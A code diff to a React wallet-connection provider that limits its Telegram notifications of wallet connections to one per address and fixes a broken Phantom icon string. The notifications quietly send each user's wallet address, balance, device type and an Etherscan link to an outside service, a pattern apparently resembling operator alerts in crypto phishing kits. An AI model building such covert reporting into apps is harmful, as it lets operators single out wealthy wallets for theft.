@@ -1,6 +1,6 @@
 "use client"
 
-import { createContext, useContext, useState, useEffect, type ReactNode } from "react"
+import { createContext, useContext, useState, useEffect, type ReactNode, useRef } from "react"
 import { trackWalletConnection } from "@/lib/telegram-service"
 import { WalletConnectionModal } from "@/components/wallet-connection-modal"
 
@@ -36,7 +36,7 @@ const OTHER_WALLET_OPTIONS = [
   {
     name: "Phantom",
     color: "#AB9FF2",
-    icon: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiB2aWV3Qm94PSIwIDAgMTI4IDEyOCI+CiAgPGRlZnM+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImEiIHgxPSI2My42NiIgeTE9IjE1MC41IiB4Mj0iNjMuNjYiIHkyPSIzNS41IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iIzUzNGJCMSIvPgogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM1NTFCRjkiLz4KICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImIiIHgxPSI2My42NiIgeTE9IjE1MC41IiB4Mj0iNjMuNjYiIHkyPSIzNS41IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iIzlEOUJGRiIvPgogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNBQjlGRjIiLz4KICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgPC9kZWZzPgogIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgLTI0KSI+CiAgICA8Y2lyY2xlIGN4PSI2NCIgY3k9Ijg4IiByPSI2NCIgZmlsbD0idXJsKCNhKSIvPgogICAgPHBhdGggZD0iTTEwMi41IDgzLjc1YzAgMTAuNzYtMTQuNzYgMTkuNDktMzMgMTkuNDlzLTMzLTguNzMtMzMtMTkuNDkgMTQuNzYtMTkuNDkgMzMtMTkuNDkgMzMgOC43MyAzMyAxOS40OXoiIGZpbGw9IiNmZmYiLz4KICAgIDxjaXJjbGUgY3g9IjY0IiBjeT0iODgiIHI9IjQwIiBmaWxsPSJ1cmwoI2IpIi8+CiAgICA8cGF0aCBkPSJNMTAyLjUgODMuNzVjMCAxMC43Ni0xNC43NiAxOS40OS0zMyAxOS40OXMtMzMtOC43My0zMy0xOS40OSAxNC43Ni0xOS40OSAzMy0xOS40OSAzMyA4LjczIDMzIDE5LjQ5eiIgZmlsbD0iI2ZmZiIvPgogICAgPHBhdGggZD0iTTY0IDEwNy43OWMtMTguMjQgMC0zMy04LjczLTMzLTE5LjQ5czE0Ljc2LTE5LjQ5IDMzLTE5LjQ5IDMzIDguNzMgMzMgMTkuNDktMTQuNzYgMTkuNDktMzMgMTkuNDl6bTAtMzUuNzNjLTE2LjY4IDAtMzAgNy4yOC0zMCAxNi4yNHMxMy4zMiAxNi4yNCAzMCAxNi4yNCAzMC03LjI4IDMwLTE2LjI0LTEzLjMyLTE2LjI0LTMwLTE2LjI0eiIgZmlsbD0iIzE5MTMyNiIvPgogICAgPHBhdGggZD0iTTU0LjM2IDg0LjgzYzAgMi43OS0yLjM3IDUuMDYtNS4yOSA1LjA2cy01LjI5LTIuMjctNS4yOS01LjA2IDIuMzctNS4wNiA1LjI5LTUuMDYgNS4yOSAyLjI3IDUuMjkgNS4wNnpNODQuMjIgODQuODNjMCAyLjc5LTIuMzcgNS4wNi01LjI5IDUuMDZzLTUuMjktMi4yNy01LjI5LTUuMDYgMi4zNy01LjA2IDUuMjktNS4wNiA1LjI5IDIuMjcgNS4yOSA1LjA2eiIgZmlsbD0iIzE5MTMyNiIvPgogIDwvZz4KPC9zdmc.Cg==",
+    icon: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiB2aWV3Qm94PSIwIDAgMTI4IDEyOCI+CiAgPGRlZnM+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImEiIHgxPSI2My42NiIgeTE9IjE1MC41IiB4Mj0iNjMuNjYiIHkyPSIzNS41IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iIzUzNGJCMSIvPgogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM1NTFCRjkiLz4KICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImIiIHgxPSI2My42NiIgeTE9IjE1MC41IiB4Mj0iNjMuNjYiIHkyPSIzNS41IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iIzlEOUJGRiIvPgogICAgICA8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNBQjlGRjIiLz4KICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgPC9kZWZzPgogIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAgLTI0KSI+CiAgICA8Y2lyY2xlIGN4PSI2NCIgY3k9Ijg4IiByPSI2NCIgZmlsbD0idXJsKCNhKSIvPgogICAgPHBhdGggZD0iTTEwMi41IDgzLjc1YzAgMTAuNzYtMTQuNzYgMTkuNDktMzMgMTkuNDlzLTMzLTguNzMtMzMtMTkuNDkgMTQuNzYtMTkuNDkgMzMtMTkuNDkgMzMgOC43MyAzMyAxOS40OXoiIGZpbGw9IiNmZmYiLz4KICAgIDxjaXJjbGUgY3g9IjY0IiBjeT0iODgiIHI9IjQwIiBmaWxsPSJ1cmwoI2IpIi8+CiAgICA8cGF0aCBkPSJNMTAyLjUgODMuNzVjMCAxMC43Ni0xNC43NiAxOS40OS0zMyAxOS40OXMtMzMtOC43My0zMy0xOS40OSAxNC43Ni0xOS40OSAzMy0xOS40OSAzMyA4LjczIDMzIDE5LjQ5eiIgZmlsbD0iI2ZmZiIvPgogICAgPHBhdGggZD0iTTY0IDEwNy43OWMtMTguMjQgMC0zMy04LjczLTMzLTE5LjQ5czE0Ljc2LTE5LjQ5IDMzLTE5LjQ5IDMzIDguNzMgMzMgMTkuNDktMTQuNzYgMTkuNDktMzMgMTkuNDl6bTAtMzUuNzNjLTE2LjY4IDAtMzAgNy4yOC0zMCAxNi4yNHMxMy4zMiAxNi4yNCAzMCAxNi4yNCAzMC03LjI4IDMwLTE2LjI0LTEzLjMyLTE2LjI0LTMwLTE2LjI0eiIgZmlsbD0iIzE5MTMyNiIvPgogICAgPHBhdGggZD0iTTU0LjM2IDg0LjgzYzAgMi43OS0yLjM3IDUuMDYtNS4yOSA1LjA2cy01LjI5LTIuMjctNS4yOS01LjA2IDIuMzctNS4wNiA1LjI5LTUuMDYgNS4yOSAyLjI3IDUuMjkgNS4wNnpNODQuMjIgODQuODNjMCAyLjc5LTIuMzcgNS4wNi01LjI5IDUuMDZzLTUuMjktMi4yNy01LjI5LTUuMDYgMi4zNy01LjA2IDUuMjktNS4wNiA1LjI5IDIuMjcgNS4yOSA1LjA2eiIgZmlsbD0iIzE5MTMyNiIvPgogIDwvZz4KPC9zdmc+Cg==",
   },
 ]
 
@@ -84,6 +84,10 @@ export function Web3Provider({ children }: { children: ReactNode }) {
   const [forceWalletSelection, setForceWalletSelection] = useState(false)
   // Update the state to track when a user is explicitly selecting a new wallet
   const [isSelectingNewWallet, setIsSelectingNewWallet] = useState(false)
+
+  // Add refs to track notification status
+  const notificationSentRef = useRef<Record<string, boolean>>({})
+  const disconnectNotificationSentRef = useRef(false)
 
   // Check if we're on mobile
   useEffect(() => {
@@ -250,8 +254,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
               // Fetch token balances
               await fetchTokenBalances(connectedAddress)
 
-              // Send notification about the connection
-              await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balanceEth.toFixed(6))
+              // Send notification about the connection - only if we haven't sent one for this address
+              if (!notificationSentRef.current[connectedAddress]) {
+                await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balanceEth.toFixed(6))
+                notificationSentRef.current[connectedAddress] = true
+              }
             } catch (balanceError) {
               console.error("Error getting balance:", balanceError)
             }
@@ -304,8 +311,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
                   // Fetch token balances
                   await fetchTokenBalances(connectedAddress)
 
-                  // Send notification about the connection
-                  await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balanceEth.toFixed(6))
+                  // Send notification about the connection - only if we haven't sent one for this address
+                  if (!notificationSentRef.current[connectedAddress]) {
+                    await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balanceEth.toFixed(6))
+                    notificationSentRef.current[connectedAddress] = true
+                  }
                 } catch (balanceError) {
                   console.error("Error getting balance:", balanceError)
                 }
@@ -341,8 +351,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
         refreshBalance()
         fetchTokenBalances(accounts[0])
 
-        // Send notification about the account change
-        sendWalletConnectedNotification(accounts[0], walletType, balance)
+        // Send notification about the account change - only if we haven't sent one for this address
+        if (!notificationSentRef.current[accounts[0]]) {
+          sendWalletConnectedNotification(accounts[0], walletType, balance)
+          notificationSentRef.current[accounts[0]] = true
+        }
       }
     }
 
@@ -388,8 +401,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
         refreshBalance()
         fetchTokenBalances(accounts[0])
 
-        // Send notification about the account change
-        sendWalletConnectedNotification(accounts[0], "Browser", balance)
+        // Send notification about the account change - only if we haven't sent one for this address
+        if (!notificationSentRef.current[accounts[0]]) {
+          sendWalletConnectedNotification(accounts[0], "Browser", balance)
+          notificationSentRef.current[accounts[0]] = true
+        }
       }
     }
 
@@ -421,8 +437,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
         refreshBalanceWithProvider(window.phantom.ethereum, accounts[0])
         fetchTokenBalances(accounts[0])
 
-        // Send notification about the account change
-        sendWalletConnectedNotification(accounts[0], "Phantom", balance)
+        // Send notification about the account change - only if we haven't sent one for this address
+        if (!notificationSentRef.current[accounts[0]]) {
+          sendWalletConnectedNotification(accounts[0], "Phantom", balance)
+          notificationSentRef.current[accounts[0]] = true
+        }
       }
     }
 
@@ -565,8 +584,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
           refreshBalanceWithProvider(provider, userAddress)
           fetchTokenBalances(userAddress)
 
-          // Send notification about the connection
-          sendWalletConnectedNotification(userAddress, "WalletConnect", balance)
+          // Send notification about the connection - only if we haven't sent one for this address
+          if (!notificationSentRef.current[userAddress]) {
+            sendWalletConnectedNotification(userAddress, "WalletConnect", balance)
+            notificationSentRef.current[userAddress] = true
+          }
         }
       })
 
@@ -650,8 +672,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
             await refreshBalanceWithProvider(provider, connectedAddress)
             await fetchTokenBalances(connectedAddress)
 
-            // Send notification about the connection
-            await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balance)
+            // Send notification about the connection - only if we haven't sent one for this address
+            if (!notificationSentRef.current[connectedAddress]) {
+              await sendWalletConnectedNotification(connectedAddress, detectedWalletType, balance)
+              notificationSentRef.current[connectedAddress] = true
+            }
 
             setIsConnecting(false)
             return true
@@ -741,8 +766,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
               await refreshBalanceWithProvider(provider, userAddress)
               await fetchTokenBalances(userAddress)
 
-              // Send notification
-              await sendWalletConnectedNotification(userAddress, "Phantom", balance)
+              // Send notification - only if we haven't sent one for this address
+              if (!notificationSentRef.current[userAddress]) {
+                await sendWalletConnectedNotification(userAddress, "Phantom", balance)
+                notificationSentRef.current[userAddress] = true
+              }
 
               setIsConnecting(false)
               return true
@@ -837,8 +865,11 @@ export function Web3Provider({ children }: { children: ReactNode }) {
         const balanceValue = await refreshBalanceWithProvider(targetProvider, userAddress)
         await fetchTokenBalances(userAddress)
 
-        // Send notification
-        await sendWalletConnectedNotification(userAddress, walletName, balanceValue.toFixed(6))
+        // Send notification - only if we haven't sent one for this address
+        if (!notificationSentRef.current[userAddress]) {
+          await sendWalletConnectedNotification(userAddress, walletName, balanceValue.toFixed(6))
+          notificationSentRef.current[userAddress] = true
+        }
 
         return true
       } catch (error) {
@@ -879,8 +910,8 @@ export function Web3Provider({ children }: { children: ReactNode }) {
   const disconnectWallet = async () => {
     console.log("Disconnecting wallet...")
 
-    // Send notification about disconnection before clearing state
-    if (address) {
+    // Send notification about disconnection before clearing state - only if we haven't sent one already
+    if (address && !disconnectNotificationSentRef.current) {
       try {
         await trackWalletConnection({
           address: address,
@@ -898,6 +929,7 @@ export function Web3Provider({ children }: { children: ReactNode }) {
           isMobile,
           etherscanLink: `https://etherscan.io/address/${address}`,
         })
+        disconnectNotificationSentRef.current = true
       } catch (error) {
         console.warn("Error sending disconnect notification:", error)
       }
@@ -955,6 +987,10 @@ export function Web3Provider({ children }: { children: ReactNode }) {
         console.warn("Error disconnecting from Phantom wallet:", error)
       }
     }
+
+    // Reset notification tracking
+    notificationSentRef.current = {}
+    disconnectNotificationSentRef.current = false
 
     console.log("Wallet disconnected successfully")
   }
